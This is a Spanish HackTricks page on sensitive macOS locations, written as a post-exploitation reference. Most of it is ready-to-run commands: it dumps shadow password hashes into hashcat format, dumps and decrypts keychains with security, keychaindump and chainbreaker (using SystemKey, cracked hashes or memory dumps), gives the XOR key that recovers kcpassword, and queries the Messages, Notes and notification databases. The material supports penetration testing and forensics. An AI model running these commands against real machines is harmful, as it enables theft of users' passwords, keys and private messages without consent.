# Ubicaciones Sensibles en macOS

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Contraseñas

### Contraseñas Shadow

La contraseña shadow se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
El siguiente oneliner se puede utilizar para volcar **toda la información sobre los usuarios** (incluida la información del hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
```bash
dscl . list /Users | grep -v '^_' | while read user; do echo -n "$user:"; dscl . -read /Users/$user dsAttrTypeNative:ShadowHashData | tr -d ' ' | cut -d '[' -f2 | cut -d ']' -f1 | xxd -r -p | base64; echo; done
```
{% endcode %}

[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este**](https://github.com/octomagon/davegrohl.git) pueden usarse para transformar el hash al **formato hashcat**.

Una alternativa de una sola línea que volcará las credenciales de todas las cuentas que no son de servicio en formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Volcado de Keychain

Tenga en cuenta que al usar el binario security para **volcar las contraseñas descifradas**, se le pedirá al usuario varias veces que permita esta operación.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Basado en este comentario [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que estas herramientas ya no funcionan en Big Sur.
{% endhint %}

El atacante aún necesita obtener acceso al sistema y escalar a privilegios de **root** para ejecutar **keychaindump**. Este enfoque tiene sus propias condiciones. Como se mencionó anteriormente, **al iniciar sesión, tu llavero se desbloquea por defecto** y permanece desbloqueado mientras usas tu sistema. Esto es por conveniencia para que el usuario no necesite ingresar su contraseña cada vez que una aplicación desee acceder al llavero. Si el usuario ha cambiado esta configuración y ha elegido bloquear el llavero después de cada uso, keychaindump ya no funcionará; depende de un llavero desbloqueado para funcionar.

Es importante entender cómo Keychaindump extrae contraseñas de la memoria. El proceso más importante en esta transacción es el **proceso "securityd"**. Apple se refiere a este proceso como un **daemon de contexto de seguridad para autorización y operaciones criptográficas**. Las bibliotecas de desarrolladores de Apple no dicen mucho al respecto; sin embargo, nos dicen que securityd maneja el acceso al llavero. En su investigación, Juuso se refiere a **la clave necesaria para descifrar el llavero como "La Clave Maestra"**. Se deben realizar una serie de pasos para adquirir esta clave, ya que se deriva de la contraseña de inicio de sesión del usuario en OS X. Si quieres leer el archivo del llavero debes tener esta clave maestra. Los siguientes pasos se pueden realizar para adquirirla. **Realiza un escaneo del montón de securityd (keychaindump hace esto con el comando vmmap)**. Las posibles claves maestras se almacenan en un área marcada como MALLOC_TINY. Puedes ver las ubicaciones de estos montones tú mismo con el siguiente comando:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** buscará en los montones devueltos ocurrencias de 0x0000000000000018. Si el valor de 8 bytes siguiente apunta al montón actual, hemos encontrado una posible clave maestra. A partir de aquí, todavía es necesario realizar un poco de desofuscación, lo cual se puede ver en el código fuente, pero como analista, la parte más importante a tener en cuenta es que los datos necesarios para descifrar esta información se almacenan en la memoria del proceso de securityd. Aquí hay un ejemplo de la salida de keychain dump.
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) puede usarse para extraer los siguientes tipos de información de un llavero de OSX de manera forense:

* Contraseña del llavero en forma de hash, adecuada para cracking con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
* Contraseñas de Internet
* Contraseñas Genéricas
* Claves Privadas
* Claves Públicas
* Certificados X509
* Notas Seguras
* Contraseñas de Appleshare

Dada la contraseña de desbloqueo del llavero, una clave maestra obtenida usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto plano.

Sin uno de estos métodos para desbloquear el llavero, Chainbreaker mostrará toda la otra información disponible.

### **Volcar claves del llavero**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **Extraer claves del llavero (con contraseñas) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Volcado de claves del llavero (con contraseñas) mediante la rotura del hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Volcar claves del llavero (con contraseñas) con volcado de memoria**

[Siga estos pasos](..#dumping-memory-with-osxpmem) para realizar un **volcado de memoria**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Volcar claves del llavero (con contraseñas) utilizando la contraseña del usuario**

Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar llaveros que pertenecen al usuario**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

El archivo **kcpassword** es un archivo que contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **habilitado el inicio de sesión automático**. Por lo tanto, el usuario será automáticamente ingresado sin que se le pida una contraseña (lo cual no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** xoreada con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña del usuario es más larga que la clave, la clave se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo, utilizando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Información Interesante en Bases de Datos

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificaciones

Puedes encontrar los datos de Notificaciones en `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La mayor parte de la información interesante estará en **blob**. Por lo tanto, necesitarás **extraer** ese contenido y **transformarlo** a un formato **legible por humanos** o usar **`strings`**. Para acceder a él puedes hacer:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notas

Las **notas** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
